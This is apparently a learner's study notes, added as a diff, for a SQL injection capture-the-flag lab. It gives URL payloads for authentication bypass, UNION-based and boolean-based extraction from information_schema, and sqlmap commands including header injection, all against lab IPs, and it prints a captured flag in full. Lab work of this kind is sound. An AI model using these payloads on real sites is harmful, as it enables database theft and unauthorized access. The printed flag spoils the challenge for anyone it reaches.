@@ -1,0 +1,48 @@
+in-band ( classic ) --> Error, Union
+inferential ( blind ) --> boolean, time
+out of band
+
+Boolean-based 
+--------------
+username --> admin' AND 1=1#
+
+Show how many columns with order by clause
+---------------------------------------------
+http://10.10.211.148/post?id=2%20order%20by%204%20-- 
+(http://10.10.211.148/post?id=2 order by 4 --)
+if order by 5 -- ( there is no column 5 so, totally, column 4 is available)
+
+Which column will be enumerated with UNION BASED SQL INJECTION
+----------------------------------------------------------------
+10.10.211.148/post?id=2 and 1=2 union select 1,2,3,4 (id=2 is true ,1=2 is false , true and false is false, ==> that means revealling the false column within column 1,2,3,4)
+
+
+http://10.10.211.148/post?id=2%20and%201=2%20union%20select%201,table_name,from%20information_schema.tables%20where%20table_schema=%27sqhell_5%27
+
+
+http://10.10.211.148/post?id=2 and 1=2 union select 1,database(),user(),4
+http://10.10.211.148/post?id=2 and 1=2 union select 1,2,table_name,4 from information_schema.tables where table_schema= 'sqhell_5' (database name= sqhell_5)
+http://10.10.231.6/post?id=2 and 1=2 union select 1,2,column_name,4 from information_schema.columns where table_name= 'flag' limit 0,1-- -
+http://10.10.231.6/post?id=2 and 1=2 union select 1,2,column_name,4 from information_schema.columns where table_name= 'flag' limit 1,1-- -
+
+limit 0,1 and 1,1 means the first 0,1 refers to data(column_name) and the second 1 refers to row
+
+http://10.10.231.6/post?id=2 and 1=2 union select 1,2,concat(id,flag),4 from sqhell_5.flag limit 0,1-- -
+
+concat(id,flag) means concatinate the id and flag data together, example id=THM and flag={FLAG5:B9C690D3B914F7038BA1FC65B3FDF3C8} 
+Final=THM{FLAG5:B9C690D3B914F7038BA1FC65B3FDF3C8} 
+
+BOOLEAN BASED SQL INJECTION
+----------------------------
+http://10.10.231.6/register/user-check?username=admin' (admin user is valid so it will return true value)
+
+http://10.10.231.6/register/user-check?username=admin' union select 1,2 from flag where flag='T%25 (there is no flag in column 1 and 2 so, admin value will return true)
+
+http://10.10.231.6/register/user-check?username=admin' union select 1,2,3 from flag where flag='T%25 (there is flag in column 3 so, the admin value will return false)
+
+Use sqlmap to extract the flag
+#sqlmap -u "http://10.10.231.6/register/user-check?username=admin" -dump
+
+SQL injection through HTTP header
+-----------------------------------
+sqlmap -u "http://10.10.245.154/" --headers="X-forwarded-for:1*" -dump
